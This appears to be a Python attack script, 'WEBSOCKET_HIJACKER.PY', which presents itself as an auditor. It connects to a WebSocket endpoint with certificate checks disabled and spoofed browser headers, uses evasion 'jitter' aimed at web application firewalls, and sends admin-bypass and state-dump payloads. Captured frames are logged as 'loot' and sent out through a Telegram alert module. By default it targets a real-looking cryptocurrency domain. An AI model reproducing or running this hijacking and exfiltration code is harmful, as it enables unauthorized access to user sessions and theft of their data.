#!/usr/bin/env python3
"""
WEBSOCKET_HIJACKER.PY v8.6 — WebSocket & Real-Time Event Stream Auditor
"""
import asyncio
import hashlib
import inspect
import json
import ssl
import sys
from urllib.parse import urlsplit, urlunsplit

import websockets

from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
from modules.loot_logger import save_session_loot
from modules.telegram_notifier import send_telegram_alert
from modules.telemetry import stream_proof

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "BLUE": "\033[94m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
}

_background_tasks: set[asyncio.Task] = set()


def terminal(message):
    sys.stdout.write(message + "\n")
    sys.stdout.flush()


def normalize_ws_uri(raw_url: str) -> str:
    cleaned = (raw_url or "").strip()
    if not cleaned:
        raise ValueError("WebSocket target URL is empty.")
    if "://" not in cleaned:
        cleaned = "wss://" + cleaned
    parsed = urlsplit(cleaned)
    scheme = (parsed.scheme or "wss").lower()
    if scheme in ("https", "wss"):
        ws_scheme = "wss"
    elif scheme in ("http", "ws"):
        ws_scheme = "ws"
    else:
        raise ValueError(f"{raw_url} isn't a valid URI: scheme isn't ws or wss")
    if not parsed.hostname:
        raise ValueError(f"Invalid WebSocket hostname in {raw_url}")
    return urlunsplit((ws_scheme, parsed.netloc, parsed.path or "/ws", parsed.query, parsed.fragment))


async def broadcast_tg_alert_async(loot_type, details):
    try:
        await asyncio.wait_for(send_telegram_alert(loot_type, details), timeout=8)
    except Exception:
        pass


def broadcast_tg_alert_sync(loot_type, details):
    """Non-blockingly fires Telegram alerts from WebSocket functions."""
    try:
        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(broadcast_tg_alert_async(loot_type, details))
            _background_tasks.add(task)
            task.add_done_callback(_background_tasks.discard)
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass


def _connect_ws(ws_uri: str, headers: dict):
    ssl_ctx = None
    if ws_uri.startswith("wss://"):
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE

    sig = inspect.signature(websockets.connect)
    kwargs = {"open_timeout": 5.0, "close_timeout": 2.0}
    if ssl_ctx is not None:
        kwargs["ssl"] = ssl_ctx

    if "additional_headers" in sig.parameters:
        kwargs["additional_headers"] = headers
    elif "extra_headers" in sig.parameters:
        kwargs["extra_headers"] = headers

    return websockets.connect(ws_uri, **kwargs)


async def audit_websocket(target_ws_url, auth_cookie=None, custom_payloads=None):
    try:
        ws_uri = normalize_ws_uri(target_ws_url)
    except ValueError as exc:
        terminal(f"{COLORS['RED']}[-] WebSocket URI error: {exc}{COLORS['RESET']}")
        return []

    terminal(
        f"\n{COLORS['MAGENTA']}[***] INITIALIZING WEBSOCKET SESSION HIJACK & FRAME AUDIT [{ws_uri}] (WAF HARDENED) [***]{COLORS['RESET']}"
    )
    apply_behavioral_jitter()

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
    }
    headers.update(get_randomized_hints())
    if auth_cookie:
        headers["Cookie"] = auth_cookie

    payloads = custom_payloads or [
        json.dumps({"action": "subscribe", "channel": "order_book"}),
        json.dumps({"action": "get_balance"}),
        json.dumps({"token": "admin", "role": "superuser", "isAdmin": True}),
        json.dumps({"method": "admin_bypass", "auth": True}),
        json.dumps({"event": "auth", "data": {"token": "bypass_token_99"}}),
        json.dumps({"cmd": "dump_state"}),
    ]

    captured_loot = []
    try:
        terminal(f"{COLORS['CYAN']}[*] Establishing WebSocket connection to {ws_uri}...{COLORS['RESET']}")
        async with _connect_ws(ws_uri, headers) as websocket:
            for payload in payloads:
                terminal(f"{COLORS['BLUE']}[*] Sending WebSocket frame payload: {payload}{COLORS['RESET']}")
                await websocket.send(payload)
                try:
                    response = await asyncio.wait_for(websocket.recv(), timeout=2.5)
                    if response and len(str(response).strip()) > 0:
                        resp_text = response.decode("utf-8", errors="replace") if isinstance(response, bytes) else str(response)
                        terminal(f"{COLORS['RED']}{COLORS['BOLD']}[!] WEBSOCKET FRAME CAPTURE / DATA EXPOSURE{COLORS['RESET']}")
                        terminal(f"  └── Received: {resp_text[:300]}{COLORS['GREEN']}")

                        loot_hash = hashlib.sha256(resp_text.encode("utf-8", errors="ignore")).hexdigest()
                        frame_entry = {
                            "sent": payload,
                            "received": resp_text,
                            "integrity_hash": loot_hash,
                        }
                        captured_loot.append(frame_entry)
                        stream_proof("WS_FRAME_CAPTURE", ws_uri, {"payload": payload}, resp_text[:200], frame_entry)
                except asyncio.TimeoutError:
                    terminal(f"{COLORS['YELLOW']}(Frame transmission timed out awaiting server response){COLORS['RESET']}")

        if captured_loot:
            terminal(f"{COLORS['GREEN']}[+] WebSocket session audit successful. Captured {len(captured_loot)} frames.{COLORS['RESET']}")
            loot_hash_summary = hashlib.sha256(str(captured_loot).encode("utf-8", errors="ignore")).hexdigest()
            loot_payload = {
                "target": ws_uri,
                "loot_count": len(captured_loot),
                "integrity_hash": loot_hash_summary,
                "frames": captured_loot[:5],
            }
            save_session_loot(
                target=ws_uri,
                endpoint="websocket_stream",
                finding_type="WEBSOCKET_HIJACK_SUCCESS",
                status=200,
                headers={},
                body=str(captured_loot),
                extra_loot=loot_payload,
            )
            broadcast_tg_alert_sync("WebSocket Session Hijack & Frame Audit", loot_payload)
        else:
            terminal(f"{COLORS['YELLOW']}[-] Connected to WebSocket but no actionable frames captured.{COLORS['RESET']}")

    except Exception as exc:
        terminal(f"{COLORS['RED']}[-] WebSocket connection/audit error: {exc}{COLORS['RESET']}")

    return captured_loot


async def run_websocket_audit(target_ws_url, auth_cookie=None, custom_payloads=None):
    """Compatibility wrapper for CognitiveOperator."""
    return await audit_websocket(target_ws_url, auth_cookie, custom_payloads)


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "wss://cryptobytes.online/ws"
    asyncio.run(audit_websocket(target))
